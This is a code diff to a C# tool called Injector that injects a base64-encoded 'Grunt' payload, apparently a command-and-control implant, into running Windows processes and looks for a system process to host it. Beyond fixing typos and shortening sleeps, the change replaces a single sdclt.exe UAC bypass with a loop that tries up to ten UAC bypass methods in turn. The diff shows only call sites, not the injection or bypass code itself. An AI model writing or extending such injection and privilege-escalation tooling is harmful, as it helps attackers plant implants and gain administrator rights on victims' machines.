@@ -38,7 +38,7 @@ namespace Injector
                     }
                     catch
                     {
-                        Console.WriteLine("error opeening file");
+                        Console.WriteLine("error opening file");
                         return 1;
                     }
                 }
@@ -63,8 +63,18 @@ namespace Injector
                         GruntInjector.Inject(processID, b64payload);
                         if (UserChecks.IsAdministrator())
                         {
-                            sdclt.bypass(args[0] + " " + args[1]);
-                            ShellComannd.ShellCmdExecute("sdclt.exe");
+                            
+                            for (int i = 0; i < 10; i++)
+                            {
+                                string Flag = null;
+                                UACBypassController.ExecuteUAC(i, args);
+                                Console.WriteLine("Do you want to try the next UAC Bypass? Y/n");
+                                Flag = Console.ReadLine();
+                                if(Flag == "N" || Flag == "n")
+                                {
+                                    return 0;
+                                }
+                            }
                         }
                         else
                         {
@@ -113,12 +123,12 @@ namespace Injector
                 {
                     try
                     {
-
-                        Console.WriteLine("Trinying PID: " + process);
+                        Console.WriteLine("Trying PID: " + process);
+                        
                         GruntInjector.Inject(process, b64payload);
-                        sdclt.Cleanup();
                         Console.WriteLine("Injected Under PID: " + process);
-                        System.Threading.Thread.Sleep(50000);
+                        System.Threading.Thread.Sleep(5000);
+                        //Console.ReadLine();
                         return 0;
 
                     }
@@ -130,9 +140,8 @@ namespace Injector
                 }
 
                 Console.WriteLine("Couldn't find a system process to inject under :(");
-                sdclt.Cleanup();
                 Console.WriteLine("Cleaning up Reg and exiting.....");
-                System.Threading.Thread.Sleep(50000);
+                System.Threading.Thread.Sleep(5000);
                 return 1;
 
             }
